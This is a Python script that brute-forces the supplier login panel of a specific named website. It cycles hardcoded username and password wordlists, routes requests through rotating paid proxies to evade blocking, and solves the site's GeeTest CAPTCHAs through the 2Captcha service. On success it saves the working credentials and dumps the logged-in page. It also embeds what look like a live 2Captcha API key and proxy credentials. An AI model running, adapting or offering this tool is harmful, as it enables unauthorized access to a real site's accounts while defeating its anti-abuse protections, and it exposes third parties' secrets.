#!/usr/bin/env python3
"""qq1.lol /sup login brute with 2Captcha GeeTest — run on China jump."""
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_sup")
OUT.mkdir(exist_ok=True)
LOG = OUT / "sup_2captcha.log"
HITS = OUT / "sup_hits.txt"
PROGRESS = OUT / "sup_progress.json"
JAR = str(OUT / "cookies.jar")

CAPTCHA2_KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
PAGE = f"{BASE}/sup/login.php"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

USERS = [
    "admin", "buyi", "buyiq", "qqkqq", "qq1", "root", "test", "sup", "supplier",
    "布衣", "faka", "ka1", "agent", "daili", "vip", "user", "demo", "qqkzc",
    "administrator", "manger", "manager", "gonghuo", "gh", "super",
]
PASSWORDS = [
    "admin", "123456", "123456789", "admin123", "admin888", "admin666", "admin@123",
    "Admin123", "Admin@123", "buyi", "buyiq", "buyi123", "buyi888", "buyi666",
    "buyi2024", "buyi2025", "buyi2026", "qq1", "qq123456", "qq1.lol", "qqkqq",
    "qqkqq123", "password", "111111", "666666", "888888", "123123", "12345678",
    "654321", "abc123", "a123456", "root", "test123", "qwerty", "830603",
    "admin2024", "admin2025", "admin2026", "sup123", "supplier", "faka123",
    "Aa123456", "1qaz2wsx", "qwer1234", "passw0rd", "1234567890", "000000",
    "布衣", "发卡", "ka1.one", "QQKZC", "qqkzc", "tianyu9080",
]

_px = None
_px_fail = 0


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(user, pwd, body=""):
    open(HITS, "a").write(f"{user}:{pwd}\n{body}\n")
    log(f"*** HIT {user}:{pwd} *** {body[:200]}")


def refresh_proxy(force=False):
    global _px, _px_fail
    if _px and not force and _px_fail < 3:
        return _px
    servers = []
    try:
        raw = subprocess.check_output(
            ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
            text=True, timeout=12,
        )
        d = json.loads(raw)
        servers = [x["server"] for x in (d.get("data") or [])]
    except Exception as e:
        log(f"query err {e}")
    if not servers or force:
        time.sleep(2)
        try:
            raw = subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG}&num=2&area=440000"],
                text=True, timeout=12,
            )
            d = json.loads(raw)
            if d.get("code") == "SUCCESS":
                servers = [x["server"] for x in d["data"]] + servers
            else:
                log(f"get: {d.get('code')} {d.get('message')}")
        except Exception as e:
            log(f"get err {e}")
    for srv in servers:
        cand = f"http://{QG}:{PW}@{srv}"
        code = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/dev/null",
             "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
            capture_output=True, text=True, timeout=14,
        ).stdout.strip()
        if code == "200":
            _px = cand
            _px_fail = 0
            log(f"proxy {srv}")
            return _px
    return _px


def curl(url, post=None, mt=18, tries=4):
    global _px_fail
    last = ""
    for _ in range(tries):
        px = refresh_proxy()
        if not px:
            time.sleep(3)
            refresh_proxy(True)
            continue
        cmd = [
            "curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
            "-A", UA, "-H", f"Referer: {PAGE}",
            "-H", "X-Requested-With: XMLHttpRequest",
            "-w", "\n__HTTP:%{http_code}",
        ]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 6).stdout or ""
        except Exception:
            out = ""
        if "__HTTP:" not in out:
            _px_fail += 1
            refresh_proxy(True)
            continue
        b, code = out.rsplit("__HTTP:", 1)
        if code.strip() == "200" and b.strip():
            return b.strip()
        last = b.strip()
        _px_fail += 1
        refresh_proxy(True)
        time.sleep(0.4)
    return last


def captcha2_balance():
    try:
        r = subprocess.run(
            ["curl", "-s", "--max-time", "15", "-X", "POST",
             "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": CAPTCHA2_KEY}),
             "https://api.2captcha.com/getBalance"],
            capture_output=True, text=True, timeout=20,
        )
        d = json.loads(r.stdout)
        return d.get("balance")
    except Exception as e:
        return f"err:{e}"


def get_geetest():
    Path(JAR).unlink(missing_ok=True)
    curl(PAGE)
    # try both captcha endpoints
    for url in [
        f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}",
        f"{BASE}/sup/ajax.php?act=captcha&t={int(time.time()*1000)}",
    ]:
        body = curl(url)
        if not body:
            continue
        try:
            d = json.loads(body)
        except Exception:
            continue
        if d.get("gt") and d.get("challenge"):
            return d
        log(f"bad captcha resp: {body[:120]}")
    raise RuntimeError("no geetest challenge")


def solve_2captcha(gt, challenge, version=None, api_server=None):
    task = {
        "type": "GeeTestTaskProxyless",
        "websiteURL": PAGE,
        "gt": gt,
        "challenge": challenge,
    }
    # Geetest v4 uses version=4 + initParameters; v3 uses challenge
    if version == 4 or (isinstance(version, str) and version.startswith("4")):
        task["version"] = 4
        if api_server:
            task["geetestApiServerSubdomain"] = api_server
    t0 = time.time()
    r = subprocess.run(
        ["curl", "-s", "--max-time", "30", "-X", "POST",
         "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": CAPTCHA2_KEY, "task": task}),
         "https://api.2captcha.com/createTask"],
        capture_output=True, text=True, timeout=35,
    )
    data = json.loads(r.stdout)
    if data.get("errorId"):
        raise RuntimeError(f"create: {data}")
    task_id = data["taskId"]
    log(f"  2captcha task={task_id}")
    deadline = time.time() + 150
    while time.time() < deadline:
        time.sleep(5)
        r = subprocess.run(
            ["curl", "-s", "--max-time", "20", "-X", "POST",
             "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": CAPTCHA2_KEY, "taskId": task_id}),
             "https://api.2captcha.com/getTaskResult"],
            capture_output=True, text=True, timeout=25,
        )
        data = json.loads(r.stdout)
        if data.get("errorId"):
            raise RuntimeError(f"poll: {data}")
        if data.get("status") == "ready":
            sol = data["solution"]
            geo = {
                "challenge": sol.get("challenge") or challenge,
                "validate": sol.get("validate") or sol.get("captcha_output") or "",
                "seccode": sol.get("seccode") or "",
            }
            # v4 fields
            if sol.get("captcha_id"):
                geo["captcha_id"] = sol["captcha_id"]
            if sol.get("lot_number"):
                geo["lot_number"] = sol["lot_number"]
            if sol.get("pass_token"):
                geo["pass_token"] = sol["pass_token"]
            if sol.get("gen_time"):
                geo["gen_time"] = sol["gen_time"]
            if sol.get("captcha_output"):
                geo["captcha_output"] = sol["captcha_output"]
            log(f"  solved in {time.time()-t0:.0f}s v={str(geo.get('validate',''))[:18]}")
            return geo
    raise RuntimeError("2captcha timeout")


def login(user, pwd, geo):
    post = {
        "user": user,
        "pass": pwd,
        "geetest_challenge": geo.get("challenge", ""),
        "geetest_validate": geo.get("validate", ""),
        "geetest_seccode": geo.get("seccode") or (geo.get("validate", "") + "|jordan"),
    }
    # also try v4 field names if present
    for k in ("captcha_id", "lot_number", "pass_token", "gen_time", "captcha_output"):
        if k in geo:
            post[k] = geo[k]
    body = curl(f"{BASE}/sup/ajax.php?act=login", post)
    if not body:
        return {"msg": "empty"}
    try:
        return json.loads(body)
    except Exception:
        return {"raw": body[:200], "msg": body[:80]}


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"ui": 0, "pi": 0}


def save_progress(ui, pi):
    PROGRESS.write_text(json.dumps({"ui": ui, "pi": pi, "ts": datetime.now().isoformat()}))


def main():
    open(LOG, "w").write("")
    bal = captcha2_balance()
    log(f"=== SUP 2CAPTCHA START balance={bal} users={len(USERS)} pwds={len(PASSWORDS)} ===")
    if isinstance(bal, (int, float)) and bal <= 0:
        log("ZERO BALANCE abort")
        return
    if not refresh_proxy(True):
        log("no proxy abort")
        return

    # probe captcha once
    try:
        cap = get_geetest()
        log(f"captcha sample keys={list(cap.keys())} gt={str(cap.get('gt'))[:16]}...")
        open(OUT / "captcha_sample.json", "w").write(json.dumps(cap, ensure_ascii=False, indent=2))
    except Exception as e:
        log(f"captcha probe fail: {e}")
        return

    prog = load_progress()
    ui0, pi0 = prog.get("ui", 0), prog.get("pi", 0)
    tested = 0

    for ui in range(ui0, len(USERS)):
        user = USERS[ui]
        start_pi = pi0 if ui == ui0 else 0
        pi = start_pi
        while pi < len(PASSWORDS):
            pwd = PASSWORDS[pi]
            log(f"--- {user} / pwd#{pi}={pwd} ---")
            try:
                refresh_proxy()
                cap = get_geetest()
                version = cap.get("version") or cap.get("success")
                # detect v4: often has captcha_id instead of classic challenge flow
                geo = solve_2captcha(
                    cap.get("gt") or cap.get("captcha_id"),
                    cap.get("challenge") or "",
                    version=4 if ("captcha_id" in cap and "challenge" not in cap) else None,
                )
            except Exception as e:
                log(f"  captcha err: {e}")
                if "ERROR_ZERO_BALANCE" in str(e) or "insufficient" in str(e).lower():
                    log("balance gone, stop")
                    return
                time.sleep(6)
                continue

            # try current password with fresh solve; if captcha accepted but wrong pwd,
            # try a few more with same token until captcha expires
            batch_end = min(pi + 3, len(PASSWORDS))
            captcha_dead = False
            while pi < batch_end and not captcha_dead:
                pwd = PASSWORDS[pi]
                resp = login(user, pwd, geo)
                code = resp.get("code")
                msg = str(resp.get("msg") or resp.get("message") or resp.get("raw") or "")
                tested += 1
                if code == 0 or (isinstance(code, int) and code == 0) or "成功" in msg:
                    hit(user, pwd, json.dumps(resp, ensure_ascii=False))
                    # dump session / follow-up
                    home = curl(f"{BASE}/sup/")
                    (OUT / "sup_home.html").write_text(home or "", errors="replace")
                    log("HIT saved, stopping")
                    return
                if "密码" in msg or "用户名" in msg or "不存在" in msg or "不正确" in msg:
                    log(f"  {user}:{pwd} -> wrong ({msg[:40]})")
                    pi += 1
                    save_progress(ui, pi)
                    time.sleep(0.15)
                elif "验证" in msg or "captcha" in msg.lower() or "请先完成" in msg:
                    log(f"  {user}:{pwd} -> captcha_expired ({msg[:40]})")
                    captcha_dead = True
                    # don't increment pi — retry same pwd with new captcha
                else:
                    log(f"  {user}:{pwd} -> {msg[:60] or resp}")
                    pi += 1
                    save_progress(ui, pi)
                    # unknown — treat carefully
                    if "empty" in msg:
                        refresh_proxy(True)
            # after batch, always new captcha
            if not captcha_dead and pi < len(PASSWORDS) and pi >= batch_end:
                pass  # continue loop for next batch with new captcha
            time.sleep(0.5)
        pi0 = 0
        save_progress(ui + 1, 0)

    log(f"=== DONE no hit tested~{tested} balance={captcha2_balance()} ===")


if __name__ == "__main__":
    main()
